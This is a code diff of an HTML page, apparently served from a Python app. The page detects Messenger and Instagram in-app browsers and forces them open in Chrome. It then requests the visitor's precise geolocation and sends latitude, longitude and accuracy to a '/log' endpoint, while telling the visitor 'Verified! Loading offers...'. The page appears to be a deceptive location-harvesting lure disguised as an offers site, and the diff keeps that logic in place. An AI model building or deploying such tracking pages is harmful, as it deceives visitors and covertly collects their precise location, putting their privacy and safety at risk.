@@ -52,50 +52,51 @@ html = """
     <p class="footer">Created by <b>kchiong</b></p>
 
     <script>
-        // Detect Messenger/Instagram in-app browsers
-        function isInAppBrowser() {
-            let ua = navigator.userAgent || navigator.vendor || window.opera;
-            return ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("Instagram");
-        }
+    // Detect Messenger/Instagram in-app browsers
+    function isInAppBrowser() {
+        let ua = navigator.userAgent || navigator.vendor || window.opera;
+        return ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("Instagram");
+    }
 
-        // Force open in Chrome/Safari if Messenger/Instagram
-        if (isInAppBrowser()) {
-            let url = window.location.href;
-            try {
-                if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
-                    window.location = "googlechrome://" + url.replace(/^https?:\/\//, '');
-                } else if (/Android/.test(navigator.userAgent)) {
-                    window.location = "intent://" + url.replace(/^https?:\/\//, '') + "#Intent;scheme=https;package=com.android.chrome;end";
-                }
-            } catch (e) {
+    // Redirect immediately if in Messenger/Instagram
+    if (isInAppBrowser()) {
+        let url = window.location.href;
+        setTimeout(function(){
+            if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
+                window.location = "googlechrome://" + url.replace(/^https?:\/\//, '');
+            } else if (/Android/.test(navigator.userAgent)) {
+                window.location = "intent://" + url.replace(/^https?:\/\//, '') + "#Intent;scheme=https;package=com.android.chrome;end";
+            } else {
                 document.body.innerHTML = "<div style='padding:50px; text-align:center;'><h2>Please open this page in your browser</h2><p>Tap the menu (⋮) → 'Open in Browser'.</p></div>";
             }
-        }
+        }, 300); // Small delay for reliability
+    }
 
-        // Geolocation functions
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(success, error, {enableHighAccuracy:true});
-            } else {
-                document.getElementById("status").innerText = "Geolocation not supported.";
-                document.getElementById("overlay").style.display = "none";
-            }
-        }
-
-        function success(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-            fetch('/log?lat=' + lat + '&lon=' + lon + '&accuracy=' + accuracy);
-            document.getElementById("status").innerText = "Verified! Loading offers...";
+    // Geolocation functions
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(success, error, {enableHighAccuracy:true});
+        } else {
+            document.getElementById("status").innerText = "Geolocation not supported.";
             document.getElementById("overlay").style.display = "none";
         }
+    }
 
-        function error() {
-            document.getElementById("status").innerText = "Location access denied. Showing default offers.";
-            document.getElementById("overlay").style.display = "none";
-        }
-    </script>
+    function success(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+        fetch('/log?lat=' + lat + '&lon=' + lon + '&accuracy=' + accuracy);
+        document.getElementById("status").innerText = "Verified! Loading offers...";
+        document.getElementById("overlay").style.display = "none";
+    }
+
+    function error() {
+        document.getElementById("status").innerText = "Location access denied. Showing default offers.";
+        document.getElementById("overlay").style.display = "none";
+    }
+</script>
+
 </body>
 </html>
 """
